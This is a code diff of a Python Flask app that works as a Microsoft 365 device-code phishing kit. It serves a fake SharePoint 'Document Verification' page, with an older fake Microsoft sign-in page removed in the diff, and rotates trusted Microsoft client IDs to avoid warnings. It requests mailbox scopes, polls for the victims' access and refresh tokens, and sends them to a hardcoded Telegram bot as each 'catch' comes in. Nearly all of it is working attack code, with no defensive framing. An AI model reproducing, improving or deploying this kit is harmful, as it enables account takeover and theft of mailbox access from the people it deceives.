@@ -2,291 +2,237 @@ import os
 import time
 import sqlite3
 import threading
-import requests
-import jwt
+import base64
 import json
-from flask import Flask, request, render_template_string, redirect, url_for
-from datetime import datetime
-
-# --- Configuration ---
-TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
-TELEGRAM_CHAT_ID = "8877118461"
-DB_PATH = "/tmp/phish.db"
-
-# Microsoft Public Client IDs (Rotated to avoid blocks)
-# These are trusted first-party apps that don't show "Unverified Publisher" warnings
-CLIENT_IDS = [
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office Desktop
-    "268761a2-03f3-40df-8a8b-c3db24145b6b",  # OneDrive Sync
-]
-
-# Scopes including Outlook IMAP/SMTP for full mailbox access
-SCOPE = "https://graph.microsoft.com/.default https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access openid profile email"
+import requests
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# --- Database Setup ---
+BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
+CHAT_ID = "8877118461"
+DB_PATH = "/tmp/phish.db"
+
+# Rotation of first-party client IDs
+CLIENT_IDS = [
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
+    "268761a2-03f3-40df-8a8b-c3db24145b6b",  # OneDrive
+]
+CLIENT_ID_INDEX = 0
+
+# FIXED SCOPE: no .default mixed with resource scopes (fixes AADSTS70011)
+SCOPE = ("offline_access openid profile email "
+         "https://outlook.office.com/IMAP.AccessAsUser.All "
+         "https://outlook.office.com/SMTP.Send "
+         "https://outlook.office.com/Mail.Read")
+
+def get_client_id():
+    return CLIENT_IDS[CLIENT_ID_INDEX % len(CLIENT_IDS)]
+
+def rotate_client_id():
+    global CLIENT_ID_INDEX
+    CLIENT_ID_INDEX += 1
+    print(f"[ROTATE] Switched to client ID index {CLIENT_ID_INDEX}", flush=True)
+
+# ---------- DB ----------
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    device_code TEXT UNIQUE,
-                    user_code TEXT,
-                    verification_uri TEXT,
-                    client_id TEXT,
-                    status TEXT DEFAULT 'pending',
-                    access_token TEXT,
-                    refresh_token TEXT,
-                    id_token TEXT,
-                    email TEXT,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )''')
+    c.execute("""CREATE TABLE IF NOT EXISTS sessions
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  device_code TEXT, user_code TEXT, client_id TEXT,
+                  status TEXT, email TEXT, tokens TEXT,
+                  created_at REAL, completed_at REAL)""")
     conn.commit()
     conn.close()
 
-def get_db():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    return conn
+init_db()
 
-# --- Telegram Notification ---
-def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "HTML"
-    }
+def db():
+    return sqlite3.connect(DB_PATH, timeout=30)
+
+# ---------- Telegram ----------
+def send_telegram(text):
     try:
-        resp = requests.post(url, json=payload, timeout=10)
-        if resp.status_code != 200:
-            print(f"Telegram API Error: {resp.text}")
+        r = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
+            timeout=15,
+        )
+        print(f"[TG] status={r.status_code}", flush=True)
+        return r.status_code == 200
     except Exception as e:
-        print(f"Telegram Connection Error: {e}")
+        print(f"[TG] EXCEPTION: {e}", flush=True)
+        return False
 
-# --- Microsoft API Helpers ---
-def get_device_code(client_id):
-    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
-    data = {
-        "client_id": client_id,
-        "scope": SCOPE
-    }
+# ---------- Decode id_token ----------
+def decode_id_token(id_token):
     try:
-        resp = requests.post(url, data=data, timeout=10)
-        if resp.status_code == 200:
-            return resp.json()
-        else:
-            print(f"Device Code Error for {client_id}: {resp.status_code} - {resp.text}")
-            return None
+        payload = id_token.split(".")[1]
+        payload += "=" * (-len(payload) % 4)
+        data = json.loads(base64.urlsafe_b64decode(payload))
+        return data.get("preferred_username") or data.get("upn") or data.get("email") or "unknown"
     except Exception as e:
-        print(f"Request Error for {client_id}: {e}")
-        return None
+        print(f"[JWT] decode failed: {e}", flush=True)
+        return "unknown"
 
-def poll_token(device_code, client_id):
-    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/token"
-    data = {
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-        "device_code": device_code,
-        "client_id": client_id
-    }
-    
+# ---------- Poll worker ----------
+def poll_worker():
+    print("[WORKER] poll_worker started", flush=True)
     while True:
         try:
-            resp = requests.post(url, data=data, timeout=10)
-            result = resp.json()
-            
-            if "access_token" in result:
-                return result
-            elif "error" in result:
-                error = result["error"]
-                if error == "authorization_pending":
-                    time.sleep(5)
+            conn = db()
+            c = conn.cursor()
+            c.execute("SELECT id, device_code, client_id FROM sessions WHERE status='pending'")
+            rows = c.fetchall()
+            for sid, device_code, client_id in rows:
+                r = requests.post(
+                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
+                    data={
+                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                        "client_id": client_id,
+                        "device_code": device_code,
+                    },
+                    timeout=15,
+                )
+                resp = r.json()
+                if "error" in resp:
+                    err = resp["error"]
+                    if err == "authorization_pending":
+                        continue
+                    elif err == "expired_token":
+                        c.execute("UPDATE sessions SET status='expired' WHERE id=?", (sid,))
+                        conn.commit()
+                        print(f"[WORKER] session {sid} expired", flush=True)
+                    elif err == "authorization_declined":
+                        c.execute("UPDATE sessions SET status='declined' WHERE id=?", (sid,))
+                        conn.commit()
+                    else:
+                        print(f"[WORKER] session {sid} error: {err}", flush=True)
                     continue
-                elif error == "slow_down":
-                    time.sleep(10)
-                    continue
-                else:
-                    # Other errors (expired, declined, bad_client_id)
-                    print(f"Polling Error: {error} - {result.get('error_description', '')}")
-                    return None
-        except Exception as e:
-            print(f"Polling Network Error: {e}")
-            time.sleep(5)
-
-def refresh_for_outlook(refresh_token, client_id):
-    """
-    Uses the captured refresh token to get a new access token specifically for Outlook/IMAP.
-    This ensures we have valid credentials for email access even if the initial token was limited.
-    """
-    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/token"
-    data = {
-        "grant_type": "refresh_token",
-        "refresh_token": refresh_token,
-        "client_id": client_id,
-        "scope": "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access openid profile email"
-    }
-    try:
-        resp = requests.post(url, data=data, timeout=10)
-        if resp.status_code == 200:
-            return resp.json()
-        else:
-            print(f"Refresh Error: {resp.status_code} - {resp.text}")
-            return None
-    except Exception as e:
-        print(f"Refresh Network Error: {e}")
-        return None
-
-# --- Routes ---
-
-@app.route('/')
-def index():
-    init_db()
-    
-    # Try each client ID until one works
-    for cid in CLIENT_IDS:
-        data = get_device_code(cid)
-        if data:
-            # Save session to DB
-            conn = get_db()
-            conn.execute(
-                "INSERT INTO sessions (device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?)",
-                (data['device_code'], data['user_code'], data['verification_uri'], cid)
-            )
-            conn.commit()
+                # SUCCESS
+                tokens = resp
+                email = decode_id_token(tokens.get("id_token", ""))
+                at = tokens.get("access_token", "N/A")
+                rt = tokens.get("refresh_token", "N/A")
+                idt = tokens.get("id_token", "N/A")
+                send_telegram(f"🎯 <b>New Catch!</b>\n\n📧 <b>Email:</b> {email}")
+                send_telegram(f"<b>access_token:</b>\n<code>{at}</code>")
+                send_telegram(f"<b>refresh_token:</b>\n<code>{rt}</code>")
+                send_telegram(f"<b>id_token:</b>\n<code>{idt}</code>")
+                print(f"[WORKER] session {sid} caught email={email}", flush=True)
+                c.execute("UPDATE sessions SET status='done', email=?, tokens=?, completed_at=? WHERE id=?",
+                          (email, json.dumps(tokens), time.time(), sid))
+                conn.commit()
             conn.close()
-            
-            # Start polling thread for this specific session
-            t = threading.Thread(target=poll_and_exfil, args=(data['device_code'], cid))
-            t.daemon = True
-            t.start()
-            
-            return render_template_string(TEMPLATE, 
-                user_code=data['user_code'], 
-                verification_uri=data['verification_uri'])
-    
-    return "Service unavailable. Please try again later.", 503
-
-def poll_and_exfil(device_code, client_id):
-    """
-    Polls for the initial token, then immediately refreshes for Outlook scopes,
-    and sends everything to Telegram.
-    """
-    print(f"Started polling for device_code: {device_code[:10]}...")
-    
-    # 1. Poll for initial token
-    tokens = poll_token(device_code, client_id)
-    
-    if not tokens:
-        print(f"Failed to get initial token for {device_code[:10]}")
-        update_status(device_code, "FAILED")
-        return
-
-    # 2. Extract Email from ID Token
-    email = "Unknown"
-    id_token = tokens.get('id_token')
-    if id_token:
-        try:
-            decoded = jwt.decode(id_token, options={"verify_signature": False})
-            email = decoded.get('upn') or decoded.get('email') or decoded.get('unique_name') or "Unknown"
         except Exception as e:
-            print(f"JWT Decode Error: {e}")
+            print(f"[WORKER] loop error: {e}", flush=True)
+        time.sleep(5)
 
-    # 3. Refresh for Outlook/IMAP Scopes
-    print(f"Initial token captured for {email}. Refreshing for Outlook scopes...")
-    outlook_tokens = refresh_for_outlook(tokens['refresh_token'], client_id)
-    
-    final_access = tokens['access_token']
-    final_refresh = tokens['refresh_token']
-    imap_access = None
-    
-    if outlook_tokens:
-        imap_access = outlook_tokens.get('access_token')
-        # Update refresh token to the latest one from the refresh flow
-        final_refresh = outlook_tokens.get('refresh_token', final_refresh)
+def start_worker():
+    t = threading.Thread(target=poll_worker, daemon=True)
+    t.start()
+    print("[WORKER] thread launched", flush=True)
 
-    # 4. Update DB
-    update_status(device_code, "SUCCESS", email, json.dumps(tokens), json.dumps(outlook_tokens))
-
-    # 5. Send Telegram Notification
-    msg = f"🎯 <b>VICTIM LOGGED IN</b>\n\n"
-    msg += f"📧 <b>Email:</b> <code>{email}</code>\n"
-    msg += f"🔑 <b>Access Token (Graph):</b> <code>{final_access[:30]}...</code>\n"
-    if imap_access:
-        msg += f"📬 <b>Access Token (IMAP):</b> <code>{imap_access[:30]}...</code>\n"
-    msg += f"🔄 <b>Refresh Token:</b> <code>{final_refresh[:30]}...</code>\n\n"
-    msg += f"<b>Full JSON Tokens:</b>\n<code>{json.dumps(tokens, indent=2)}</code>"
-    
-    if outlook_tokens:
-        msg += f"\n\n<b>Outlook Refresh Response:</b>\n<code>{json.dumps(outlook_tokens, indent=2)}</code>"
-
-    send_telegram_message(msg)
-    print(f"Exfiltration complete for {email}")
-
-def update_status(device_code, status, email=None, tokens=None, outlook_tokens=None):
-    conn = get_db()
-    conn.execute(
-        "UPDATE sessions SET status=?, email=?, access_token=?, refresh_token=? WHERE device_code=?",
-        (status, email, tokens, outlook_tokens, device_code)
-    )
-    conn.commit()
-    conn.close()
-
-# --- HTML Template (Microsoft Device Login Clone) ---
-TEMPLATE = """
+# ---------- Landing Page (SharePoint verification style) ----------
+LANDING = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; border-radius: 2px; }
-        .logo { width: 108px; margin-bottom: 24px; }
-        h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; text-align: left; }
-        p { font-size: 15px; color: #1b1b1b; margin-bottom: 24px; line-height: 1.5; text-align: left; }
-        .code-box { background: #f2f2f2; padding: 12px; font-size: 24px; font-weight: 600; letter-spacing: 2px; text-align: center; margin-bottom: 24px; border: 1px solid #ccc; border-radius: 4px; cursor: pointer; user-select: all; }
-        .btn { background: #0067b8; color: white; border: none; padding: 12px 24px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; border-radius: 4px; transition: background 0.2s; }
-        .btn:hover { background: #005da6; }
-        .footer { margin-top: 24px; font-size: 12px; color: #666; text-align: center; }
-        a { color: #0067b8; text-decoration: none; }
-        a:hover { text-decoration: underline; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Document Verification | SharePoint</title>
+<style>
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;margin:0;background:#faf9f8}
+.topbar{background:#ffffff;border-bottom:1px solid #e1dfdd;padding:14px 32px;display:flex;align-items:center}
+.topbar svg{height:26px;margin-right:10px}
+.topbar span{font-size:17px;font-weight:600;color:#323130}
+.hero{background:#0364b8;color:#fff;padding:48px 32px;text-align:center}
+.hero h1{margin:0;font-size:28px;font-weight:400}
+.hero p{margin:10px 0 0;font-size:15px;opacity:.9}
+.card{max-width:560px;margin:-28px auto 0;background:#fff;border:1px solid #e1dfdd;box-shadow:0 2px 6px rgba(0,0,0,.08);padding:36px;text-align:center;position:relative}
+.codebox{background:#f3f2f1;border:1px solid #8a8886;padding:16px;font-size:30px;font-weight:600;letter-spacing:6px;margin:20px 0;color:#323130;user-select:all}
+.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;font-size:15px;cursor:pointer;width:100%;font-family:inherit}
+.btn:hover{background:#106ebe}
+.note{font-size:13px;color:#605e5c;margin-top:18px;line-height:1.5}
+.footer{max-width:560px;margin:24px auto;font-size:12px;color:#605e5c;text-align:center}
+</style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" class="logo" alt="Microsoft">
-        <h1>Sign in</h1>
-        <p>To sign in, use the code shown below and go to <a href="{{ verification_uri }}" target="_blank">{{ verification_uri }}</a></p>
-        
-        <div class="code-box" id="codeBox" onclick="copyCode()">{{ user_code }}</div>
-        
-        <button class="btn" onclick="openLogin()">Next</button>
-        
-        <div class="footer">
-            Can't use your device? <a href="#">Try another way to sign in</a>
-        </div>
-    </div>
-
-    <script>
-        function copyCode() {
-            const code = document.getElementById('codeBox').innerText;
-            navigator.clipboard.writeText(code).then(() => {
-                // Optional: Visual feedback could be added here
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
-            });
-        }
-        function openLogin() {
-            window.location.href = "{{ verification_uri }}";
-        }
-    </script>
+<div class="topbar">
+  <svg viewBox="0 0 24 24" fill="#0364b8"><path d="M3 3h10v18H3V3zm12 4h6v14h-6V7z"/></svg>
+  <span>SharePoint</span>
+</div>
+<div class="hero">
+  <h1>Document Verification Required</h1>
+  <p>Your shared document requires secure sign-in verification</p>
+</div>
+<div class="card">
+  <p style="font-size:15px;color:#323130;margin:0 0 6px;">To verify your account, enter this code at</p>
+  <p style="font-size:15px;font-weight:600;color:#0078d4;margin:0 0 12px;">https://microsoft.com/devicelogin</p>
+  <div class="codebox" id="userCode">{{ user_code }}</div>
+  <button class="btn" onclick="copyAndGo()">Copy Code &amp; Continue</button>
+  <p class="note">This code expires in 15 minutes. Never share it with anyone outside your organization.</p>
+</div>
+<div class="footer">&copy; 2026 Microsoft Corporation. All rights reserved.</div>
+<script>
+function copyAndGo(){
+  var code = document.getElementById('userCode').innerText.trim();
+  function go(){ window.location.href = 'https://microsoft.com/devicelogin'; }
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(code).then(go, go);
+  } else {
+    var ta = document.createElement('textarea');
+    ta.value = code; document.body.appendChild(ta);
+    ta.select(); try{ document.execCommand('copy'); }catch(e){}
+    document.body.removeChild(ta); go();
+  }
+}
+</script>
 </body>
 </html>
 """
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+# ---------- Routes ----------
+@app.route("/")
+def index():
+    global CLIENT_ID_INDEX
+    init_db()
+
+    device_data = None
+    for attempt in range(len(CLIENT_IDS)):
+        client_id = get_client_id()
+        try:
+            r = requests.post(
+                "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
+                data={"client_id": client_id, "scope": SCOPE},
+                timeout=15,
+            )
+            if r.status_code == 200:
+                device_data = r.json()
+                break
+            print(f"[INIT] client {client_id} failed: {r.status_code} {r.text[:150]}", flush=True)
+            rotate_client_id()
+        except Exception as e:
+            print(f"[INIT] exception: {e}", flush=True)
+            rotate_client_id()
+
+    if not device_data:
+        return "Service temporarily unavailable. Please refresh.", 503
+
+    conn = db()
+    conn.execute(
+        "INSERT INTO sessions (device_code, user_code, client_id, status, created_at) VALUES (?,?,?,?,?)",
+        (device_data["device_code"], device_data["user_code"], get_client_id(), "pending", time.time()),
+    )
+    conn.commit()
+    conn.close()
+
+    return render_template_string(LANDING, user_code=device_data["user_code"])
+
+start_worker()
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
